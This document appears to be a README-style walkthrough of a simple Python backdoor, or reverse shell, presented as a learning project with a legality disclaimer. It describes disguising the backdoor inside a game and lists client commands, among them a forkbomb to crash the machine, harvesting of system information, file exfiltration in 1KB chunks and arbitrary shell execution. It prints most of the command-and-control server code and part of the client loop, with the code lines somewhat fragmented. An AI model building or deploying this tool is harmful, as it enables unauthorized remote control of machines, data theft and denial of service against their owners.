# In simpler terms, a backdoor is a piece of software installed on a machine that gives someone remote access to a computer, usually without proper permission. For example, a hacker might use a backdoor to maintain remote access on a compromised machine. A hacker might disguise a backdoor inside a seemingly regular looking game or program. Once the user of the target machine runs the program, the backdoor hidden in the software will allow the hacker to remotely connect to the target machine, usually through a command line. Through that remote connection, the hacker can execute commands, edit and read files, and more.

Commands (Client):

1. "List files" (This command is used instead of ls because sometimes, ls is inconsistent)

2. "Forkbomb" (A forkbomb is an attack when a process replicates itself over and over again, causing all system resources to be consumed, usually causing the system to crash. The while loop infinitely duplicates the python process infinitely, causing the computer to crash)

3. "cd" (This command works better than the cd that is built into bash. This is because when the directory is changed in Linux, the python working directory isn't affected. This command uses os.chdir() to change the working directory in python and in Linux. Splitting the command allows for the argument (in this case, the directory to change to) to be processed separately)

4. "sysinfo" (The sysinfo command uses a combination of the platform module and the getpass module to get information about the system such as: the operating system, the hostname of the machine, the current user, the current os version, and processor architecture. This text is nicely formatted and sent to the host server)

5. "Download" (The download command is a little more complicated. Once again, the command is split to extract the argument. This time, instead of sending the data from the file all at once, the file must be split into 1024 byte (1KB) because the server can only receive 1 kilobyte at a time. Once the file is done sending, the client sends "DONE" (in bytes) to the server to let the server know that the file transfer is complete)

6. "Exit" (When calling exit, the text "exit" (in bytes) is sent to the server. This notifies the server to terminate the connection. Break exits the while True loop, terminating the program)

7. "Any other command" (If the command that was entered isn't a known internal command, it is executed through the system instead. The subprocess module is used to execute the command through the system's shell. The output is returned to two variables, STDOUT and STDERR. STDOUT is the standard system output. STDERR is the standard error output. The next if statement checks if the output went to STDOUT or STDERR. It sends the appropriate data once it has been checked)


#  if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()

"Finally, if no command is received, the program can assume that there was an error in the connection and will terminate the loop. Since the entire code is wrapped in a try-except, the program will send the exception to the server. Once the loop terminates, the socket will close".


# Server information - Explanation

# colorama.init()

LHOST = "127.0.0.1"
LPORT = 2222

"These first few lines are for initialization. The LHOST is the IP which the server will be hosted on. The LPORT is the port where the server will be hosted".

# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept()

"Lines 9-13 are for initializing the server. Once again, socket.AF_INET is to start a server on an IPV4 address and socket.SOCK_STREAM is to run the server on a TCP port. sock.bind((LHOST, LPORT)) starts a server on the given IP and port. sock.listen(1) tells the program to only accept one incoming connection. The client is an object that allows the program to interact with the connected client, for example, send data. The addr is a tuple that contains the IP and port of the connected client".

# while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

"Just like the client, the entire code is wrapped in a while True: loop so that the commands can constantly send and executed, until the loop breaks. The input_header is the text before the input. Example: hacked@linux-machine:/usr/hacked/Desktop$. This data is received from the client and is entered as an argument to the input function. The user is asked to enter a command, it is encoded into bytes and saved into the command variable".

#  if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break
        print("Finished reading data")

"There is only one pre-defined command built into the server; download. When download is executed, it opens a new file with the name of the file to be downloaded. Next, the function reads 1KB at a time and writes that data to the file. If the server receives the data "DONE" (in bytes), the loop for receiving data stops".

#   if command is b"":
        print("Please enter a command")

"If no command is entered, the user is reminded that data must be entered".

#   else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)

"If none of the other conditions are met, the script sends the command to the client to be executed. The data variable receives the output from the command (sent by the client). If the data that is received is "exit", the server terminates the connection and breaks the loop, which exits the script. Once the loop breaks, the connection to the client and the server socket is closed".



# Remember, entering any computer without permission is illegal. This script was made because I am interested in how these types of technologies work. Do not use this program for any illegal reasons. This program is also a very simple backdoor and is not 100% stable or complete.


